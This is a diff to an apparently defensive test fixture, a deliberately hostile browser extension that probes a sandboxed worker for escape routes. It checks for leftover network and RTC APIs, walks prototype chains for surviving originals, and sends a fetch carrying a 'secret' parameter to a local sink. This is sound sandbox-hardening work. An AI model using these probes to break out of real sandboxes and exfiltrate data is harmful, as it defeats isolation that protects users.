@@ -1,9 +1,12 @@
 // A hostile extension: runs in the sandbox worker and tries every way out it can think of. Each attempt goes to the
 // sink on 127.0.0.1 (the port replaces __SINK_PORT__), so the sink's log says what really got through. The result of
-// every attempt is posted to the app window in one message: { event: "attack-done", results }.
+// every attempt is stored with nimble.storage.set("attack", json) (one of the few ways to get a message to the app).
 //
 // outcome: "LEAK" = the attempt worked; "blocked" = it failed; "n/a" = the API is not there; "undefined" = a global
-// that must not exist in a worker is indeed missing; "DEFINED" = such a global exists (a failure).
+// that must not exist in a worker is indeed missing; "DEFINED" = such a global exists (a failure); "confined" = it
+// worked but could do nothing outside (a worker the extension made itself, which inherits the policy).
+// Names that start with "lockdown" only hold when the worker bootstrap removed the network APIs (defence in depth);
+// the others must hold with the CSP alone.
 (async function () {
   var SINK = "http://127.0.0.1:__SINK_PORT__";
   var WSSINK = "ws://127.0.0.1:__SINK_PORT__";
@@ -15,6 +18,7 @@
       var r = await Promise.race([fn(), timeout(4000)]);
       if (r && r.leak) rec(name, "LEAK", r.d);
       else if (r && r.na) rec(name, "n/a", r.d);
+      else if (r && r.confined) rec(name, "confined", r.d);
       else rec(name, "blocked", r && r.timeout ? "no connection before the timeout" : r && r.d);
     } catch (e) { rec(name, "blocked", (e && e.name) + ": " + (e && e.message)); }
   }
@@ -26,6 +30,24 @@
   try { new RTCDataChannel(); rec("new RTCDataChannel()", "LEAK", "constructed"); } catch (e) { rec("new RTCDataChannel()", "blocked", e.name + ": " + e.message); }
   try { new RTCPeerConnection(); rec("new RTCPeerConnection()", "LEAK", "constructed"); } catch (e) { rec("new RTCPeerConnection()", "blocked", e.name + ": " + e.message); }
   rec("typeof navigator.mediaDevices", typeof navigator.mediaDevices === "undefined" ? "undefined" : "DEFINED", typeof navigator.mediaDevices);
+
+  // The network APIs are gone from the extension's point of view (the worker bootstrap removes them as defence in depth).
+  ["fetch", "XMLHttpRequest", "WebSocket", "EventSource", "WebTransport", "importScripts", "Worker", "SharedWorker"].forEach(function (n) {
+    rec("lockdown typeof " + n, typeof self[n] === "undefined" ? "undefined" : "DEFINED", typeof self[n]);
+  });
+  rec("lockdown typeof navigator.sendBeacon", typeof navigator.sendBeacon === "undefined" ? "undefined" : "DEFINED", typeof navigator.sendBeacon);
+  // ... and no original is left on the prototype chains to be found there.
+  var found = [];
+  [self, navigator].forEach(function (start) {
+    for (var o = start; o; o = Object.getPrototypeOf(o)) {
+      ["fetch", "XMLHttpRequest", "WebSocket", "EventSource", "WebTransport", "importScripts", "Worker", "SharedWorker", "sendBeacon"].forEach(function (n) {
+        var d = Object.getOwnPropertyDescriptor(o, n);
+        if (d && typeof d.value === "function") found.push(n);
+        if (d && typeof d.get === "function" && d.get.call(start) !== undefined) found.push(n + " (getter)");
+      });
+    }
+  });
+  rec("lockdown prototype chain holds no original", found.length ? "LEAK" : "undefined", found.join(","));
 
   // Network.
   await attempt("fetch", async function () { var r = await fetch(SINK + "/t/fetch?d=secret"); return { leak: true, d: "status " + r.status }; });
@@ -112,10 +134,11 @@
       w.onmessage = function (e) {
         var o = e.data;
         rec("nested Worker: typeof RTCPeerConnection", o.rtc === "undefined" ? "undefined" : "DEFINED", o.rtc);
-        res({ leak: /LEAK/.test(JSON.stringify(o)), d: "created; " + JSON.stringify(o) });
+        var leaked = /LEAK/.test(JSON.stringify(o));
+        res({ leak: leaked, confined: !leaked, d: "created; " + JSON.stringify(o) });
       };
     });
   });
 
-  postMessage({ event: "attack-done", results: results });
+  await nimble.storage.set("attack", JSON.stringify(results));
 })();
